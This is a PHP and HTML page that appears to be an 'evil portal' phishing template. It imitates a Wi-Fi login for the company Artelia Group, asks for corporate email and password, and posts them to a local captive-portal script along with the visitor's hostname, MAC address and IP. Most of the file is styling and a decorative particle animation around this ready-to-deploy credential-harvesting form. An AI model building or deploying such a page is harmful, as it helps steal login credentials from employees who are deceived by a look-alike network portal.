<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connexion Artelia Group</title>

  <!-- ✅ Mini framework Tailwind-like local -->
  <style>
  *,::before,::after{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}
  html{line-height:1.5;-webkit-text-size-adjust:100%;font-family:system-ui,sans-serif}
  body{margin:0;line-height:inherit}
  img{display:block;max-width:100%;height:auto}
  button,input{font-family:inherit;font-size:100%;line-height:inherit;color:inherit;margin:0}
  button{text-transform:none;background-color:transparent;background-image:none;cursor:pointer}
  .text-center{text-align:center}
  .text-gray-800{color:#1f2937}
  .text-gray-400{color:#9ca3af}
  .text-gray-500{color:#6b7280}
  .bg-blue-600{background-color:#2563eb}
  .hover\:bg-blue-700:hover{background-color:#1d4ed8}
  .text-white{color:#fff}
  .rounded-xl{border-radius:0.75rem}
  .font-bold{font-weight:700}
  .px-4{padding-left:1rem;padding-right:1rem}
  .py-3{padding-top:0.75rem;padding-bottom:0.75rem}
  .w-full{width:100%}
  .mx-auto{margin-left:auto;margin-right:auto}
  .mt-2{margin-top:0.5rem}
  .mt-4{margin-top:1rem}
  .mt-6{margin-top:1.5rem}
  .mb-8{margin-bottom:2rem}
  .space-y-6> :not([hidden])~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1.5rem*(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1.5rem*var(--tw-space-y-reverse))}
  .transition-all{transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:150ms}
  .hover\:scale-105:hover{transform:scale(1.05)}
  .focus\:ring-2:focus{outline:2px solid transparent;outline-offset:2px;box-shadow:0 0 0 2px #60a5fa}
  .bg-gray-100{background-color:#f3f4f6}
  .text-sm{font-size:.875rem}
  .text-xs{font-size:.75rem}
  .text-2xl{font-size:1.5rem}
  </style>

  <style>
    body {
      font-family: 'Inter', sans-serif;
      background: radial-gradient(circle at top, #111b3a 0%, #0f172a 80%);
      height: 100vh;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #1f2937;
    }

    /* Canvas particules */
    #particles {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: -1;
    }

    /* Conteneur du formulaire */
    .form-container {
      background: linear-gradient(180deg, #ffffff 0%, #f9fafb 100%);
      border-radius: 1.5rem;
      box-shadow: 0 10px 30px rgba(59,130,246,0.25);
      padding: 2.5rem;
      width: 100%;
      max-width: 400px;
      position: relative;
      z-index: 10;
      text-align: center;
    }

    .input-glow:focus {
      box-shadow: 0 0 10px rgba(59,130,246,0.5);
    }

    /* Champ + label flottant */
    .relative {position: relative;}
    input {
      border: none;
      border-radius: 0.75rem;
      background: #f3f4f6;
      width: 100%;
      padding: 0.9rem 1rem;
      font-size: 0.95rem;
      color: #111827;
    }

    label {
      position: absolute;
      left: 1rem;
      top: 0.85rem;
      color: #9ca3af;
      font-size: 0.875rem;
      transition: all 0.2s ease;
      pointer-events: none;
    }

    input:focus + label,
    input:not(:placeholder-shown) + label {
      top: -0.5rem;
      font-size: 0.75rem;
      color: #3b82f6;
      background: #fff;
      padding: 0 0.3rem;
    }

    /* Bouton toggle mot de passe */
    .toggle-password {
      position: absolute;
      right: 0.9rem;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #6b7280;
      font-size: 1rem;
      transition: color 0.2s;
    }
    .toggle-password:hover {
      color: #3b82f6;
    }

    /* Bouton principal */
    button[type="submit"] {
      border: none;
      cursor: pointer;
    }

    /* Footer */
    .footer {
      color: #9ca3af;
      font-size: 0.8rem;
      margin-top: 1.5rem;
    }
  </style>
</head>

<body>

  <canvas id="particles"></canvas>

  <div class="form-container">
    <img src="assets/artelia_logo.jpg" alt="Artelia Group" class="mx-auto w-32" style="margin-bottom:1.2rem;">
    <h1 class="text-gray-800 text-2xl font-bold">Portail Wi-Fi Artelia</h1>
    <p class="text-gray-500 mt-2 text-sm">
      Connectez-vous avec vos identifiants <strong>ARTELIA GROUP</strong> pour accéder au réseau
    </p>

    <!-- ✅ Formulaire POST conservé -->
    <form id="loginForm" method="POST" action="/captiveportal/index.php" class="space-y-6 mt-6 relative">
      <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
      <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
      <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
      <input type="hidden" name="target" value="<?=$destination?>">

      <!-- Email -->
      <div class="relative">
        <input type="email" name="email" id="email" placeholder=" " required class="input-glow focus:ring-2 focus:ring-blue-400 focus:border-blue-400" />
        <label for="email">Adresse e-mail</label>
      </div>

      <!-- Password -->
      <div class="relative">
        <input type="password" name="password" id="password" placeholder=" " required class="input-glow focus:ring-2 focus:ring-blue-400 focus:border-blue-400" />
        <label for="password">Mot de passe</label>
        <button type="button" id="togglePw" class="toggle-password" title="Afficher / masquer le mot de passe">👁️</button>
      </div>

      <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl transition-all hover:scale-105">
        Se connecter
      </button>
    </form>

    <p class="footer">© 2025 Artelia Group. Tous droits réservés.</p>
  </div>

  <!-- JS toggle password -->
  <script>
    const togglePw = document.getElementById('togglePw');
    const password = document.getElementById('password');
    togglePw.addEventListener('click', () => {
      const isHidden = password.type === 'password';
      password.type = isHidden ? 'text' : 'password';
      togglePw.textContent = isHidden ? '🙈' : '👁️';
    });
  </script>

  <!-- JS Particules -->
  <script>
    const canvas = document.getElementById('particles');
    const ctx = canvas.getContext('2d');
    let particlesArray = [];
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    window.addEventListener('resize', () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      init();
    });

    class Particle {
      constructor(x, y, size, speedX, speedY) {
        this.x = x;
        this.y = y;
        this.size = size;
        this.speedX = speedX;
        this.speedY = speedY;
      }
      update() {
        this.x += this.speedX;
        this.y += this.speedY;
        if (this.x > canvas.width || this.x < 0) this.speedX = -this.speedX;
        if (this.y > canvas.height || this.y < 0) this.speedY = -this.speedY;
      }
      draw() {
        ctx.fillStyle = 'rgba(59, 130, 246, 0.7)';
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fill();
      }
    }

    function init() {
      particlesArray = [];
      let numberOfParticles = (canvas.width * canvas.height) / 15000;
      for (let i = 0; i < numberOfParticles; i++) {
        let size = Math.random() * 3 + 1;
        let x = Math.random() * canvas.width;
        let y = Math.random() * canvas.height;
        let speedX = (Math.random() - 0.5) * 0.5;
        let speedY = (Math.random() - 0.5) * 0.5;
        particlesArray.push(new Particle(x, y, size, speedX, speedY));
      }
    }

    function connectParticles() {
      for (let a = 0; a < particlesArray.length; a++) {
        for (let b = a; b < particlesArray.length; b++) {
          const dx = particlesArray[a].x - particlesArray[b].x;
          const dy = particlesArray[a].y - particlesArray[b].y;
          const distance = Math.sqrt(dx * dx + dy * dy);
          if (distance < 120) {
            ctx.strokeStyle = `rgba(59, 130, 246, ${0.2})`;
            ctx.lineWidth = 1;
            ctx.beginPath();
            ctx.moveTo(particlesArray[a].x, particlesArray[a].y);
            ctx.lineTo(particlesArray[b].x, particlesArray[b].y);
            ctx.stroke();
          }
        }
      }
    }

    function animate() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      particlesArray.forEach(p => {
        p.update();
        p.draw();
      });
      connectParticles();
      requestAnimationFrame(animate);
    }

    init();
    animate();
  </script>

</body>
</html>
